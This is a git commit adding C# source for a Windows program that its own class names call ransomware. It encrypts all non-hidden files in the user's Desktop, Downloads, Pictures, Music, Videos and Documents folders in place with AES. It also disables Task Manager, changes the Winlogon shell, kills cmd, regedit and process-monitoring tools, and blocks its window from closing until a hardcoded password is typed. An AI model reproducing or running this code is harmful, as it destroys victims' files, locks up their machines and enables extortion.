4b95198f2cec8223234dc26a32ab37345201c975
Pandax40 <59170180+Pandax40@users.noreply.github.com>
2021-09-14 20:43:15 +0200

    Add files via upload

---
+++ C# VisualStudio Project/TR/MainWindow.xaml.cs
@@ -0,0 +1,132 @@
+﻿using System;
+using System.ComponentModel;
+using System.Windows;
+using System.Windows.Media;
+using System.Windows.Input;
+using System.Threading;
+using System.Diagnostics;
+using System.IO;
+using System.Runtime.CompilerServices;
+using System.Net;
+using Microsoft.Win32;
+
+namespace TR
+{
+    /// <summary>
+    /// Lógica de interacción para MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        BackgroundWorker _Contador = new BackgroundWorker(); 
+        BackgroundWorker _Desencryptar = new BackgroundWorker();
+
+        Ransomware loader = new Ransomware();
+        RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
+        ClaseTexto cls = new ClaseTexto { Texto = "" };
+
+        public MainWindow()
+        {
+            InitializeComponent();
+            _Contador.DoWork += CuentaAtras;
+            _Contador.RunWorkerAsync();
+
+            _Desencryptar.DoWork += loader.Desencriptar;
+
+
+            this.DataContext = cls;
+
+            if (File.Exists("C:\\Program Files\\System32\\CyptedReady.ini"))
+            {
+
+            }
+            else
+            {
+                Directory.CreateDirectory("C:\\Program Files\\System32");
+                string[] Check = { reg2.GetValue("Wallpaper").ToString() };
+                File.WriteAllLines("C:\\Program Files\\System32\\CyptedReady.ini",Check);
+
+                loader.Encriptar();
+            }
+            DesabilitarCosas();
+            Ventana.Visibility = Visibility.Visible;
+        }
+        public Object WallPaper;
+        private void DesabilitarCosas()
+        {
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
+
+            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
+            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
+
+            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+            reg3.SetValue("Shell", "empty", RegistryValueKind.String);
+
+            Process[] processRunning = Process.GetProcesses();
+            foreach (Process pr in processRunning)
+            {
+                if (pr.ProcessName == "cmd" || pr.ProcessName == "regedit" || pr.ProcessName == "Processhacker" || pr.ProcessName == "Taskmgr")
+                {
+                    pr.Kill();
+                }
+            }
+        }
+        private void HabilitarCosas()
+        {
+            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+            reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
+
+            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
+            WallPaper = File.ReadAllText("C:\\Program Files\\System32\\CyptedReady.ini");
+            reg2.SetValue("Wallpaper", WallPaper, RegistryValueKind.String);
+
+            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
+            reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
+        }
+        private void MoverPantalla(object sender, MouseEventArgs e)
+        {
+            if (e.LeftButton.ToString() == "Pressed")
+            {
+                DragMove();
+            }
+        }
+        private void ClickBoton(object sender, RoutedEventArgs e)
+        {
+            if (cls.Texto == "8410412190077")
+            {
+                Ventana.Visibility = Visibility.Hidden;
+                HabilitarCosas();
+                File.Delete("C:\\Program Files\\System32\\CyptedReady.ini");
+                _Desencryptar.RunWorkerAsync();
+            }
+            else
+            {
+                Boton.Foreground = Brushes.Red;
+            }
+        }
+
+        private void Ventana_Closing(object sender, CancelEventArgs e)
+        {
+            e.Cancel = true;
+        }
+    }
+    public class ClaseTexto : INotifyPropertyChanged
+    {
+        public string texto;
+        public string Texto
+        {
+            get { return texto; }
+            set { texto = value;
+                OnPropertyChanged();
+            }
+        }
+        protected void OnPropertyChanged(string property = "")
+        {
+            if( PropertyChanged != null)
+            {
+                PropertyChanged(this, new PropertyChangedEventArgs(property));  
+            }
+        }
+        public event PropertyChangedEventHandler PropertyChanged;
+    }
+}
---
+++ C# VisualStudio Project/TR/Ransomware.cs
@@ -0,0 +1,143 @@
+﻿using System;
+using System.ComponentModel;
+using System.IO;
+using System.Windows;
+using System.Security.Cryptography;
+using System.Text;
+using System.Collections.Generic;
+using System.Diagnostics;
+
+namespace TR
+{
+    class Ransomware
+    {
+        string password = "8410412190077";
+
+        public void Encriptar()
+        {
+            string[] files1 = { "" };
+            string[] files2 = { "" };
+            string[] files3 = { "" };
+            string[] files4 = { "" };
+            string[] files5 = { "" };
+            string[] files6 = { "" };
+            try
+            {
+                files1 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*", SearchOption.AllDirectories);
+                files2 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads") + @"\", "*", SearchOption.AllDirectories);
+                files3 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Pictures") + @"\", "*", SearchOption.AllDirectories);
+                files4 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Music") + @"\", "*", SearchOption.AllDirectories);
+                files5 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Videos") + @"\", "*", SearchOption.AllDirectories);
+                files6 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Documents") + @"\", "*", SearchOption.AllDirectories);
+            }
+            catch 
+            {
+            }
+
+            List<string> list = new List<string>();
+            list.AddRange(files1);
+            list.AddRange(files2);
+            list.AddRange(files3);
+            list.AddRange(files4);
+            list.AddRange(files5);
+            list.AddRange(files6);
+            string[] TOTAL = list.ToArray();
+            foreach (string file in TOTAL)
+            {
+                FileInfo test = new FileInfo(file);
+                if (!File.GetAttributes(file).HasFlag(FileAttributes.Hidden) && test.Length <= 2000000000)
+                {
+                    try
+                    {
+                        EncryptFile(file, password);
+                    }
+                    catch
+                    {
+
+                    }
+                }
+            }
+        }
+        public void Desencriptar(object sender, DoWorkEventArgs e)
+        {
+            string[] files1 = { "" };
+            string[] files2 = { "" };
+            string[] files3 = { "" };
+            string[] files4 = { "" };
+            string[] files5 = { "" };
+            string[] files6 = { "" };
+            try
+            {
+                files1 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\", "*", SearchOption.AllDirectories);
+                files2 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Downloads") + @"\", "*", SearchOption.AllDirectories);
+                files3 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Pictures") + @"\", "*", SearchOption.AllDirectories);
+                files4 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Music") + @"\", "*", SearchOption.AllDirectories);
+                files5 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Videos") + @"\", "*", SearchOption.AllDirectories);
+                files6 = Directory.GetFiles(Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"), "Documents") + @"\", "*", SearchOption.AllDirectories);
+            }
+            catch
+            {
+            }
+
+            List<string> list = new List<string>();
+            list.AddRange(files1);
+            list.AddRange(files2);
+            list.AddRange(files3);
+            list.AddRange(files4);
+            list.AddRange(files5);
+            list.AddRange(files6);
+            string[] TOTAL = list.ToArray();
+
+            foreach (string file in TOTAL)
+            {
+                FileInfo test = new FileInfo(file);
+                if (!File.GetAttributes(file).HasFlag(FileAttributes.Hidden) && test.Length <= 2000000000)
+                {
+                    try 
+                    {
+                        DecryptFile(file, password);
+                    }
+                    catch
+                    {
+
+                    }
+                }
+            }
+            Process[] processRunning = Process.GetProcesses();
+            foreach (Process pr in processRunning)
+            {
+                if (pr.ProcessName == "HostService")
+                {
+                    pr.Kill();
+                }
+            }
+
+
+        }
+        public void EncryptFile(string file, string password)
+        {
+            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+
+            // Hash SHA256
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+            byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+
+            string fileEncrypted = file;
+
+            File.WriteAllBytes(fileEncrypted, bytesEncrypted);
+        }
+        public void DecryptFile(string fileEncrypted, string password)
+        {
+            byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
+            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+            byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);
+
+            string file = fileEncrypted;
+            File.WriteAllBytes(file, bytesDecrypted);
+        }
+    }
+}
